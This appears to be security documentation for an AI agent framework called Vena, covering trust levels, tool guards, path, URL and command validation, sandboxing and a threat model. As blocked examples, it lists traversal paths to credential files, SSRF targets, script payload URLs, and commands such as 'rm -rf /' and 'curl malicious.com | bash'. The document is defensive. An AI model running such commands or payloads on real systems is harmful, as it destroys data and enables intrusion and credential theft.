# Security

Security model, trust levels, and ToolGuard enforcement in Vena.

## Table of Contents
- [Overview](#overview)
- [Trust Levels](#trust-levels)
- [ToolGuard](#toolguard)
- [Path Validation](#path-validation)
- [URL Validation](#url-validation)
- [Command Validation](#command-validation)
- [Environment Sanitization](#environment-sanitization)
- [Gateway Security](#gateway-security)
- [Docker Sandbox](#docker-sandbox)
- [Best Practices](#best-practices)

## Overview

Vena implements defense-in-depth security:

**Layers:**
1. **Trust Levels** - Coarse-grained tool access control
2. **ToolGuard** - Fine-grained enforcement at execution time
3. **Path Validation** - Block sensitive files and traversal attacks
4. **URL Validation** - Block private IPs and dangerous protocols
5. **Command Validation** - Allowlist shell commands
6. **Environment Sanitization** - Strip secrets from subprocess env
7. **Gateway Auth** - Optional API key authentication
8. **Rate Limiting** - Prevent abuse
9. **Docker Sandbox** - Optional containerized execution

## Trust Levels

Three levels control tool access per agent.

### Full

**Tools enabled:**
- bash (shell execution)
- read, write, edit (filesystem)
- web_browse (HTTP fetch)
- browser (Playwright automation)
- google (Google Workspace)

**Use cases:**
- Primary assistant agents
- Trusted agents with full system access
- Local development

**Configuration:**
```json
{
  "agents": {
    "registry": [
      {
        "id": "main",
        "trustLevel": "full"
      }
    ]
  }
}
```

**Risk:** Agent can execute arbitrary commands, read/write files, access network.

### Limited

**Tools enabled:**
- read, write, edit (filesystem)
- web_browse (HTTP fetch)
- browser (Playwright automation)
- google (Google Workspace)

**Tools disabled:**
- bash (shell execution)

**Use cases:**
- Specialized agents (research, analysis)
- Agents exposed to semi-trusted users
- **Recommended default**

**Configuration:**
```json
{
  "agents": {
    "registry": [
      {
        "id": "researcher",
        "trustLevel": "limited"
      }
    ]
  }
}
```

**Risk:** Agent can read/write files and access network, but cannot execute shell commands.

### Readonly

**Tools enabled:**
- read (filesystem)
- web_browse (HTTP fetch)

**Tools disabled:**
- bash, write, edit, browser, google

**Use cases:**
- Experimental agents
- Agents exposed to untrusted users
- Read-only analysis tasks
- Public-facing bots

**Configuration:**
```json
{
  "agents": {
    "registry": [
      {
        "id": "public-assistant",
        "trustLevel": "readonly"
      }
    ]
  }
}
```

**Risk:** Agent can only read files and fetch URLs. Cannot modify system.

### Comparison

| Tool | Readonly | Limited | Full |
|------|----------|---------|------|
| bash | ❌ | ❌ | ✅ |
| read | ✅ | ✅ | ✅ |
| write | ❌ | ✅ | ✅ |
| edit | ❌ | ✅ | ✅ |
| web_browse | ✅ | ✅ | ✅ |
| browser | ❌ | ✅ | ✅ |
| google | ❌ | ✅ | ✅ |

### Default Trust Level

Set global default:
```json
{
  "security": {
    "defaultTrustLevel": "limited"
  }
}
```

Agents without explicit `trustLevel` inherit this.

## ToolGuard

`ToolGuard` sits between `ToolExecutor` and tool execution. It enforces security policies at runtime.

### Architecture

```
Agent requests tool execution
        ↓
   ToolExecutor
        ↓
    ToolGuard ──> Validate trust level
        │         Validate path/URL
        │         Validate command
        │         Sanitize environment
        ↓
   Tool executes
        ↓
    Return result
```

### Enforcement

**Trust Level Check:**
```typescript
if (tool.name === 'bash' && trustLevel !== 'full') {
  throw new Error('Tool bash requires trust level full');
}
```

**Path Validation:**
```typescript
if (path.includes('.env')) {
  throw new Error('Path matches blocked pattern: .env');
}
```

**URL Validation:**
```typescript
if (url.startsWith('http://192.168.')) {
  throw new Error('URL contains private IP');
}
```

**Command Validation:**
```typescript
if (!allowedCommands.includes(command)) {
  throw new Error('Command not in allowlist');
}
```

### Configuration

```json
{
  "security": {
    "defaultTrustLevel": "limited",
    "pathPolicy": {
      "blockedPatterns": [".env", ".ssh", ".aws"]
    },
    "shell": {
      "allowedCommands": ["git", "npm", "node"]
    },
    "urlPolicy": {
      "allowPrivateIPs": false
    }
  }
}
```

## Path Validation

Protects against malicious file access.

### Blocked Patterns

Default blocked patterns:
```json
{
  "security": {
    "pathPolicy": {
      "blockedPatterns": [
        ".env",
        ".env.*",
        ".ssh",
        ".ssh/*",
        ".aws",
        ".aws/*",
        ".git/config",
        "id_rsa",
        "*.pem",
        "*.key"
      ]
    }
  }
}
```

### Traversal Protection

Path traversal attacks are blocked:

**Blocked:**
- `../../../etc/passwd`
- `./../../.ssh/id_rsa`
- `/Users/alice/../bob/.env`

**Allowed:**
- `/Users/alice/project/src/config.ts`
- `./src/index.ts`
- `~/Documents/notes.txt`

### Workspace Validation

Coming soon - restrict to allowed workspace roots:
```json
{
  "security": {
    "pathPolicy": {
      "allowedRoots": [
        "/Users/alice/projects",
        "/tmp/workspace"
      ]
    }
  }
}
```

### Testing

```bash
# This should fail:
vena chat
> Read the file at /Users/alice/.env
Error: Path matches blocked pattern: .env

# This should work:
> Read the file at ./src/config.ts
[File contents]
```

## URL Validation

Protects against SSRF and network attacks.

### Private IP Blocking

Default: private IPs are blocked.

**Blocked:**
- `http://127.0.0.1`
- `http://localhost`
- `http://192.168.1.1`
- `http://10.0.0.1`
- `http://172.16.0.1`
- `http://169.254.169.254` (AWS metadata)

**Allowed:**
- `https://api.github.com`
- `https://example.com`
- `https://93.184.216.34` (public IP)

### Override (Not Recommended)

```json
{
  "security": {
    "urlPolicy": {
      "allowPrivateIPs": true
    }
  }
}
```

**Risk:** Allows SSRF attacks against internal services.

### Protocol Validation

Only `http://` and `https://` allowed.

**Blocked:**
- `file:///etc/passwd`
- `ftp://example.com`
- `javascript:alert(1)`
- `data:text/html,<script>alert(1)</script>`

### Testing

```bash
vena chat
> Fetch http://192.168.1.1
Error: URL contains private IP

> Fetch https://github.com
[Page content]
```

## Command Validation

Allowlist shell commands to prevent dangerous execution.

### Default Allowlist

```json
{
  "security": {
    "shell": {
      "allowedCommands": [
        "git",
        "npm",
        "pnpm",
        "node",
        "npx",
        "ls",
        "cat",
        "find",
        "grep",
        "pwd",
        "echo",
        "which"
      ]
    }
  }
}
```

### Validation

Only the command name (first word) is checked:

**Allowed:**
```bash
git status
npm install
ls -la
```

**Blocked:**
```bash
rm -rf /
curl malicious.com | bash
sudo su
```

### Custom Allowlist

Add commands as needed:
```json
{
  "security": {
    "shell": {
      "allowedCommands": [
        "git", "npm", "node",
        "docker", "kubectl", "terraform"
      ]
    }
  }
}
```

**Warning:** Be conservative. Each command increases attack surface.

### Dangerous Commands

**Never add:**
- `rm` - File deletion
- `sudo` - Privilege escalation
- `su` - User switching
- `chmod` - Permission changes
- `curl | bash` - Remote execution
- `eval` - Code execution
- `dd` - Disk operations

## Environment Sanitization

Strip secrets from subprocess environment.

### Default Passthrough

Only safe env vars passed to subprocesses:
```json
{
  "security": {
    "shell": {
      "envPassthrough": [
        "PATH",
        "HOME",
        "USER",
        "SHELL",
        "LANG",
        "LC_ALL",
        "NODE_ENV",
        "TERM"
      ]
    }
  }
}
```

### Blocked by Default

These are **never** passed:
- `*_API_KEY`
- `*_SECRET`
- `*_TOKEN`
- `AWS_*`
- `GOOGLE_*`
- `ANTHROPIC_*`
- `OPENAI_*`
- `SSH_*`

### Custom Passthrough

Add env vars as needed:
```json
{
  "security": {
    "shell": {
      "envPassthrough": [
        "PATH", "HOME",
        "NPM_TOKEN",
        "CUSTOM_VAR"
      ]
    }
  }
}
```

**Warning:** Only add if subprocess genuinely needs it.

## Gateway Security

HTTP/WebSocket server security features.

### API Key Authentication

**Enable:**
```json
{
  "gateway": {
    "auth": {
      "enabled": true,
      "apiKeys": [
        "secret-key-1",
        "secret-key-2"
      ]
    }
  }
}
```

**Use:**
```bash
curl -X POST http://localhost:18789/api/message \
  -H 'Authorization: Bearer secret-key-1' \
  -H 'Content-Type: application/json' \
  -d '{"content":"Hello"}'
```

Or:
```bash
curl -X POST http://localhost:18789/api/message \
  -H 'X-API-Key: secret-key-1' \
  -H 'Content-Type: application/json' \
  -d '{"content":"Hello"}'
```

### Rate Limiting

**Enable:**
```json
{
  "gateway": {
    "rateLimit": {
      "enabled": true,
      "windowMs": 60000,
      "maxRequests": 120
    }
  }
}
```

- 120 requests per minute per IP
- Returns `429 Too Many Requests` when exceeded
- Window resets every minute

### Message Size Limit

**Configure:**
```json
{
  "gateway": {
    "maxMessageSize": 102400
  }
}
```

Default: 100 KB (102400 bytes)

Prevents DoS via large payloads.

### Bind Address

**Local only (default):**
```json
{
  "gateway": {
    "host": "127.0.0.1"
  }
}
```

**Public (not recommended without auth):**
```json
{
  "gateway": {
    "host": "0.0.0.0"
  }
}
```

**Warning:** Only bind to `0.0.0.0` if using reverse proxy with SSL + auth.

## Docker Sandbox

Isolate tool execution in Docker containers.

### Configuration

```json
{
  "computer": {
    "docker": {
      "enabled": true,
      "image": "node:22-slim",
      "memoryLimit": "512m",
      "cpuLimit": "1.0",
      "network": "none",
      "readOnlyRoot": true
    }
  }
}
```

### Benefits

**Isolation:**
- Completely isolated from host
- Limited filesystem access
- Limited network access
- Resource constraints

**Security:**
- Even if agent is compromised, damage contained
- Read-only root filesystem
- No network = no data exfiltration
- Auto-cleanup on completion

### Trade-offs

**Slower:**
- Container startup overhead
- More memory usage

**Complexity:**
- Requires Docker installed
- Harder to debug
- Limited filesystem access

### Network Modes

**None (most secure):**
```json
{
  "computer": {
    "docker": {
      "network": "none"
    }
  }
}
```

No network access. Agent is air-gapped.

**Bridge:**
```json
{
  "computer": {
    "docker": {
      "network": "bridge"
    }
  }
}
```

Bridge network. Agent can access internet but not host network.

**Host (least secure):**
```json
{
  "computer": {
    "docker": {
      "network": "host"
    }
  }
}
```

Host network. Agent can access localhost and internal services.

### Example: Internet-Isolated Agent

```json
{
  "agents": {
    "registry": [
      {
        "id": "isolated",
        "trustLevel": "full"
      }
    ]
  },
  "computer": {
    "docker": {
      "enabled": true,
      "network": "none",
      "memoryLimit": "256m",
      "readOnlyRoot": true
    }
  }
}
```

Agent can execute bash but:
- No network access
- Read-only root filesystem
- 256 MB memory limit

## Best Practices

### Trust Level Selection

1. **Default to `limited`** for all agents
2. Use `full` only for primary, trusted agents
3. Use `readonly` for public-facing agents
4. Never use `full` for untrusted user input

### Path Security

1. **Never disable path validation**
2. Keep blocked patterns comprehensive
3. Add workspace root restrictions
4. Audit file access logs regularly
5. Use Docker sandbox for untrusted execution

### URL Security

1. **Keep private IP blocking enabled**
2. Use Docker with `network: none` for untrusted web browsing
3. Validate URLs before opening in browser
4. Monitor outbound requests

### Shell Security

1. **Minimize allowed commands**
2. Never allow: `rm`, `sudo`, `curl | bash`
3. Use Docker sandbox for shell execution
4. Sanitize environment variables
5. Audit shell command logs

### Gateway Security

1. **Enable auth for production**
2. Use strong, random API keys (32+ chars)
3. Enable rate limiting
4. Set message size limits
5. Bind to `127.0.0.1` or use reverse proxy
6. Use SSL/TLS (nginx, Caddy)
7. Monitor rate limit violations

### API Keys

1. **Use environment variables**
2. Never commit keys to git
3. Rotate keys periodically (monthly)
4. Use separate keys for dev/staging/prod
5. Revoke compromised keys immediately
6. Monitor API usage in provider dashboards

### Multi-Tenant

If running for multiple users:
1. Use `readonly` trust level
2. Enable Docker sandbox
3. Set `network: none`
4. Enable gateway auth
5. Implement per-user rate limits (coming soon)
6. Isolate memory per user (namespaces)

### Monitoring

1. **Log all tool executions**
2. Alert on suspicious activity:
   - Blocked path access attempts
   - Blocked URL access attempts
   - Blocked command attempts
   - Rate limit violations
3. Review logs weekly
4. Monitor resource usage

### Incident Response

If compromise suspected:
1. Stop Vena immediately: `pkill -f vena`
2. Rotate all API keys
3. Review logs: `~/.vena/logs/`
4. Check for unauthorized file changes
5. Check for unauthorized network connections
6. Restore from backup if needed

## Security Checklist

### Development

- [ ] Use `limited` trust level by default
- [ ] Keep blocked patterns up to date
- [ ] Use environment variables for secrets
- [ ] Test with `readonly` trust level
- [ ] Review tool access logs

### Staging

- [ ] Enable gateway auth
- [ ] Enable rate limiting
- [ ] Use strong API keys
- [ ] Test Docker sandbox
- [ ] Monitor resource usage

### Production

- [ ] Enable gateway auth ✅
- [ ] Enable rate limiting ✅
- [ ] Use reverse proxy with SSL ✅
- [ ] Bind to `127.0.0.1` or use firewall ✅
- [ ] Use Docker sandbox for untrusted execution ✅
- [ ] Set `network: none` for Docker ✅
- [ ] Rotate API keys monthly ✅
- [ ] Monitor logs for suspicious activity ✅
- [ ] Set up alerts ✅
- [ ] Have backup and restore plan ✅

## Threat Model

### Threats

**Malicious User Input:**
- Prompt injection attempts
- Path traversal attempts
- SSRF attempts
- Command injection attempts

**Compromised Agent:**
- Reads sensitive files (`.env`, `.ssh`)
- Executes malicious commands
- Exfiltrates data via network
- Modifies critical files

**Network Attacks:**
- SSRF to internal services
- Data exfiltration
- Credential theft from metadata endpoints

### Mitigations

| Threat | Mitigation |
|--------|-----------|
| Prompt injection | Skill XML escaping, validation |
| Path traversal | Path validation, blocked patterns |
| SSRF | URL validation, private IP blocking |
| Command injection | Command allowlist, env sanitization |
| File access | Trust levels, path validation |
| Data exfiltration | Docker sandbox with `network: none` |
| Privilege escalation | No `sudo`, no `su` in allowlist |

## Compliance

### GDPR

- User data stored locally (`~/.vena/`)
- Memory can be deleted on request
- No data sent to third parties (except chosen LLM provider)
- Encryption in transit (HTTPS for API calls)

### SOC 2

- Access control via trust levels
- Audit logging of tool executions
- API key authentication
- Rate limiting
- Environment sanitization

## Next Steps

- [Tools Guide](./tools.md) - Understand tool access per trust level
- [Configuration](./configuration.md) - Full security config reference
- [Agents Guide](./agents.md) - Configure per-agent trust levels
